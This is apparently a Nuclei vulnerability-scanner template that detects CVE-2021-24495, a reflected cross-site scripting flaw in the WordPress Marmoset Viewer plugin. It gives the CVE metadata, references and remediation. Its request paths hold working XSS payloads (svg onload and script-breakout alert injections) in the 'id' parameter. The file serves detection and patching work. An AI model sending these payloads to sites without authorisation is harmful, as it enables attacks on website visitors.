http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - </script><svg/onload=alert('{{randstr}}')>
    - alert(/{{randstr}}/)
  - type: word
    words:
    - Marmoset Viewer
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>'
  - '{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a'
id: CVE-2021-24495
info:
  author: johnjhacking
  classification:
    cpe: cpe:2.3:a:marmoset:marmoset_viewer:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24495
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.96663
    epss-score: 0.32206
  description: WordPress Marmoset Viewer plugin before 1.9.3 contains a cross-site
    scripting vulnerability. It does not property sanitize, validate, or escape the
    'id' parameter before outputting back in the page.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: marmoset_viewer
    vendor: marmoset
  name: Wordpress Marmoset Viewer <1.9.3 - Cross-Site Scripting
  reference:
  - https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/
  - https://wordpress.org/plugins/marmoset-viewer/#developers
  - https://wpscan.com/vulnerability/d11b79a3-f762-49ab-b7c8-3174624d7638
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24495
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update the Wordpress Marmoset Viewer plugin to version 1.9.3 or later
    to mitigate the vulnerability.

    '
  severity: medium
  tags: cve2021,cve,xss,wpscan,wp-plugin,wordpress,intrusive,marmoset,vuln
